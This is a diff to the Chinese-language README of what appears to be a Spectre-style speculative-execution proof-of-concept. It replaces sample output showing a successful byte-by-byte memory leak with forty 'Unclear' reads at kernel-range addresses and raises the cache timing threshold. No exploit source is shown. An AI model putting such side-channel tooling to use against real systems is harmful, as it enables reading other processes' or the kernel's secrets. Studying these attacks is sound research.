@@ -40,7 +40,7 @@ make run
 
 ## 输出示例
 ```TEXT
-Using a cache hit threshold of 80.
+Using a cache hit threshold of 150.
 Build:
 RDTSCP  Yes
 MFENCE  Yes
@@ -48,10 +48,46 @@ CLFLUSH Yes
 INTEL_MITIGATION        No
 LINUX_KERNEL_MITIGATION No
 Reading 40 bytes:
-Reading at malicious_x = 0x55b3e2ae6020... Success: 0x54='T' count=101
-Reading at malicious_x = 0x55b3e2ae6021... Success: 0x68='h' count=99
-Reading at malicious_x = 0x55b3e2ae6022... Success: 0x65='e' count=103
-...
+Reading at malicious_x = 0xffffffffffffdfe8... Unclear: 0x4D='M' count=305      (second best: 0xE5='?' count=304)
+Reading at malicious_x = 0xffffffffffffdfe9... Unclear: 0x84='?' count=875      (second best: 0xDA='?' count=872)
+Reading at malicious_x = 0xffffffffffffdfea... Unclear: 0x16='?' count=883      (second best: 0x28='(' count=882)
+Reading at malicious_x = 0xffffffffffffdfeb... Unclear: 0x9B='?' count=864      (second best: 0xE0='?' count=858)
+Reading at malicious_x = 0xffffffffffffdfec... Unclear: 0xF6='?' count=870      (second best: 0xC0='?' count=865)
+Reading at malicious_x = 0xffffffffffffdfed... Unclear: 0x3A=':' count=861      (second best: 0xE1='?' count=860)
+Reading at malicious_x = 0xffffffffffffdfee... Unclear: 0x17='?' count=864      (second best: 0x45='E' count=858)
+Reading at malicious_x = 0xffffffffffffdfef... Unclear: 0x31='1' count=856      (second best: 0x35='5' count=855)
+Reading at malicious_x = 0xffffffffffffdff0... Unclear: 0x38='8' count=862      (second best: 0x28='(' count=858)
+Reading at malicious_x = 0xffffffffffffdff1... Unclear: 0xEC='?' count=862      (second best: 0x34='4' count=862)
+Reading at malicious_x = 0xffffffffffffdff2... Unclear: 0xD5='?' count=884      (second best: 0xE5='?' count=881)
+Reading at malicious_x = 0xffffffffffffdff3... Unclear: 0xFF='?' count=933      (second best: 0x1C='?' count=932)
+Reading at malicious_x = 0xffffffffffffdff4... Unclear: 0x7F='?' count=962      (second best: 0xDD='?' count=960)
+Reading at malicious_x = 0xffffffffffffdff5... Unclear: 0xEE='?' count=960      (second best: 0xBB='?' count=957)
+Reading at malicious_x = 0xffffffffffffdff6... Unclear: 0xA6='?' count=944      (second best: 0x62='b' count=944)
+Reading at malicious_x = 0xffffffffffffdff7... Unclear: 0xE2='?' count=966      (second best: 0xDE='?' count=963)
+Reading at malicious_x = 0xffffffffffffdff8... Unclear: 0xEF='?' count=967      (second best: 0x27=''' count=966)
+Reading at malicious_x = 0xffffffffffffdff9... Unclear: 0xC7='?' count=938      (second best: 0xE9='?' count=936)
+Reading at malicious_x = 0xffffffffffffdffa... Unclear: 0x96='?' count=928      (second best: 0x44='D' count=924)
+Reading at malicious_x = 0xffffffffffffdffb... Unclear: 0xDD='?' count=952      (second best: 0x87='?' count=951)
+Reading at malicious_x = 0xffffffffffffdffc... Unclear: 0x61='a' count=894      (second best: 0xFC='?' count=893)
+Reading at malicious_x = 0xffffffffffffdffd... Unclear: 0xE6='?' count=885      (second best: 0xF7='?' count=882)
+Reading at malicious_x = 0xffffffffffffdffe... Unclear: 0x61='a' count=911      (second best: 0xB6='?' count=910)
+Reading at malicious_x = 0xffffffffffffdfff... Unclear: 0xC8='?' count=872      (second best: 0x35='5' count=871)
+Reading at malicious_x = 0xffffffffffffe000... Unclear: 0x48='H' count=876      (second best: 0xC8='?' count=875)
+Reading at malicious_x = 0xffffffffffffe001... Unclear: 0xE6='?' count=890      (second best: 0x1C='?' count=887)
+Reading at malicious_x = 0xffffffffffffe002... Unclear: 0xA8='?' count=892      (second best: 0x61='a' count=882)
+Reading at malicious_x = 0xffffffffffffe003... Unclear: 0x4D='M' count=879      (second best: 0x28='(' count=876)
+Reading at malicious_x = 0xffffffffffffe004... Unclear: 0x21='!' count=860      (second best: 0xB0='?' count=856)
+Reading at malicious_x = 0xffffffffffffe005... Unclear: 0xF7='?' count=876      (second best: 0x67='g' count=863)
+Reading at malicious_x = 0xffffffffffffe006... Unclear: 0xE0='?' count=868      (second best: 0x30='0' count=867)
+Reading at malicious_x = 0xffffffffffffe007... Unclear: 0x9C='?' count=870      (second best: 0x9D='?' count=862)
+Reading at malicious_x = 0xffffffffffffe008... Unclear: 0x5C='\' count=864      (second best: 0x67='g' count=858)
+Reading at malicious_x = 0xffffffffffffe009... Unclear: 0xB4='?' count=861      (second best: 0x9E='?' count=861)
+Reading at malicious_x = 0xffffffffffffe00a... Unclear: 0xEC='?' count=863      (second best: 0x16='?' count=858)
+Reading at malicious_x = 0xffffffffffffe00b... Unclear: 0xAC='?' count=880      (second best: 0x96='?' count=876)
+Reading at malicious_x = 0xffffffffffffe00c... Unclear: 0xE5='?' count=969      (second best: 0x86='?' count=968)
+Reading at malicious_x = 0xffffffffffffe00d... Unclear: 0x42='B' count=976      (second best: 0x26='&' count=968)
+Reading at malicious_x = 0xffffffffffffe00e... Unclear: 0xEF='?' count=962      (second best: 0x27=''' count=959)
+Reading at malicious_x = 0xffffffffffffe00f... Unclear: 0xE8='?' count=926      (second best: 0xBE='?' count=926)
 ```
 
 每行依次给出：
